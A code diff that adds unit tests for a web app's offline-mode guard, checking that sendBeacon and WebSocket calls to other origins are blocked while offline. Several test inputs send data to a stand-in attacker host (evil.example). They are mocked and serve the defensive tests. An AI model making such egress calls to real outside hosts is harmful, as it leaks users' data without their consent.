@@ -67,4 +67,72 @@ describe('offline module', () => {
     await expect(fetch('  https://evil.example/x')).rejects.toThrow(/offline mode/i);
     expect(inner).not.toHaveBeenCalled();
   });
+
+  describe('navigator.sendBeacon guard', () => {
+    const realSendBeacon = navigator.sendBeacon;
+    afterEach(() => {
+      navigator.sendBeacon = realSendBeacon;
+    });
+
+    it('blocks cross-origin sendBeacon while offline, returning false', () => {
+      const inner = vi.fn().mockReturnValue(true);
+      navigator.sendBeacon = inner;
+      installOfflineFetchGuard();
+      useSettingsStore.getState().setOfflineMode(true);
+      expect(navigator.sendBeacon('https://evil.example/collect', 'x')).toBe(false);
+      expect(inner).not.toHaveBeenCalled();
+    });
+
+    it('passes same-origin sendBeacon through while offline', () => {
+      const inner = vi.fn().mockReturnValue(true);
+      navigator.sendBeacon = inner;
+      installOfflineFetchGuard();
+      useSettingsStore.getState().setOfflineMode(true);
+      expect(navigator.sendBeacon('/collect', 'x')).toBe(true);
+      expect(inner).toHaveBeenCalledTimes(1);
+    });
+
+    it('passes sendBeacon through untouched when offline mode is off', () => {
+      const inner = vi.fn().mockReturnValue(true);
+      navigator.sendBeacon = inner;
+      installOfflineFetchGuard();
+      expect(navigator.sendBeacon('https://example.com/collect', 'x')).toBe(true);
+      expect(inner).toHaveBeenCalledTimes(1);
+    });
+  });
+
+  describe('WebSocket guard', () => {
+    const RealWebSocket = globalThis.WebSocket;
+    class MockWebSocket {
+      url: string;
+      constructor(url: string | URL) {
+        this.url = String(url);
+      }
+    }
+    afterEach(() => {
+      globalThis.WebSocket = RealWebSocket;
+    });
+
+    it('blocks a cross-origin WebSocket connection while offline', () => {
+      globalThis.WebSocket = MockWebSocket as unknown as typeof WebSocket;
+      installOfflineFetchGuard();
+      useSettingsStore.getState().setOfflineMode(true);
+      expect(() => new WebSocket('wss://evil.example/socket')).toThrow(/offline mode/i);
+    });
+
+    it('constructs a same-origin WebSocket while offline', () => {
+      globalThis.WebSocket = MockWebSocket as unknown as typeof WebSocket;
+      installOfflineFetchGuard();
+      useSettingsStore.getState().setOfflineMode(true);
+      const ws = new WebSocket('/socket');
+      expect(ws).toBeInstanceOf(MockWebSocket);
+    });
+
+    it('constructs any WebSocket untouched when offline mode is off', () => {
+      globalThis.WebSocket = MockWebSocket as unknown as typeof WebSocket;
+      installOfflineFetchGuard();
+      const ws = new WebSocket('wss://example.com/socket');
+      expect(ws).toBeInstanceOf(MockWebSocket);
+    });
+  });
 });
